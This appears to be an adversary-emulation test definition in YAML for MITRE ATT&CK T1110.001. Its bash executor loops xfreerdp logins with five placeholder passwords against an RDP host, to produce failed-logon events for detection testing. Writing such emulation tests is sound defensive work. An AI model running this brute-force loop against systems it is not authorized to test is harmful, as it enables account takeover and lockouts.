attack_technique: T1110.001
display_name: 'Brute Force: Password Guessing (RDP)'

atomic_tests:
  - name: RDP Password Guessing via xfreerdp
    auto_generated_guid: 5da3597c-e06e-4402-bb2c-cf0f1624b595

    description: |
      Simulates password guessing against an authorized RDP endpoint
      using xfreerdp from a Linux attacker host.

      The test is designed to generate failed Windows authentication
      events (Event ID 4625) on the target endpoint.

    supported_platforms:
      - linux

    input_arguments:
      target_ip:
        description: IP address of the authorized RDP target.
        type: String
        default: 10.0.1.10

      username:
        description: Username used for authentication attempts.
        type: String
        default: Ragnar

    executor:
      command: |
        passwords=(
          "111111111111"
          "2222222222222"
          "333333333333"
          "444444444444"
          "555555555555"
        )

        for pass in "${passwords[@]}"; do
          echo "[T1110.001] Attempting RDP authentication with password: $pass"

          xfreerdp \
            /v:#{target_ip} \
            /u:#{username} \
            /p:"$pass" \
            /cert:ignore \
            /timeout:5000

          sleep 2
        done

      name: bash
